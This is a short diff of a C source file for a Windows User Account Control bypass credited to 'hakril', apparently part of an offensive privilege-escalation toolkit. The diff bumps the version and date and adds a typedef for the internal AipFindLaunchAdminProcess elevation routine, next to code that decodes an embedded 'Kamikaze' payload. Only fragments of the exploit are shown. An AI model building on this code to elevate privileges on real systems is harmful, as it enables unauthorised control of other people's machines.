@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2020
+*  (C) COPYRIGHT AUTHORS, 2017 - 2022
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.50
+*  VERSION:     3.61
 *
-*  DATE:        14 Sep 2020
+*  DATE:        22 Jun 2022
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -18,6 +18,17 @@
 *******************************************************************************/
 #include "global.h"
 #include "encresource.h"
+
+typedef ULONG_PTR(WINAPI* pfnAipFindLaunchAdminProcess)(
+    LPWSTR lpApplicationName,
+    LPWSTR lpParameters,
+    DWORD UacRequestFlag,
+    DWORD dwCreationFlags,
+    LPWSTR lpCurrentDirectory,
+    HWND hWnd,
+    PVOID StartupInfo,
+    PVOID ProcessInfo,
+    ELEVATION_REASON* ElevationReason);
 
 /*
 * ucmHakrilMethod
@@ -117,7 +128,9 @@ NTSTATUS ucmHakrilMethod(
             (CONST PVOID)g_encodedKamikazeFinal,
             sizeof(g_encodedKamikazeFinal),
             'kmkz'))
+        {
             break;
+        }
 
         //
         // Build Kamikaze filename.
